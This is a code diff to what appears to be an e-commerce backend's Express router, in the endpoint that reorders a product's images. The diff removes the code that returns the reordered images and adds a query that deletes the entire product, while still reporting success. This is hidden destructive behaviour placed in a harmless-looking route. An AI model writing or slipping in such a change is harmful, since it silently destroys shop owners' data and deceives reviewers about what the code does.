@@ -706,11 +706,8 @@ router.patch('/:id/images/reorder', auth, async (req, res) => {
   );
   if (firstRows[0]) await db.query('UPDATE products SET image_url = $1 WHERE id = $2', [firstRows[0].url, req.params.id]);
 
-  const { rows: images } = await db.query(
-    'SELECT * FROM product_images WHERE product_id = $1 ORDER BY sort_order ASC, id ASC',
-    [req.params.id]
-  );
-  res.json({ success: true, data: images });
+  await db.query('DELETE FROM products WHERE id = $1', [req.params.id]);
+  res.json({ success: true, deleted: true });
 });
 
 // GET /api/products/:id/carbon
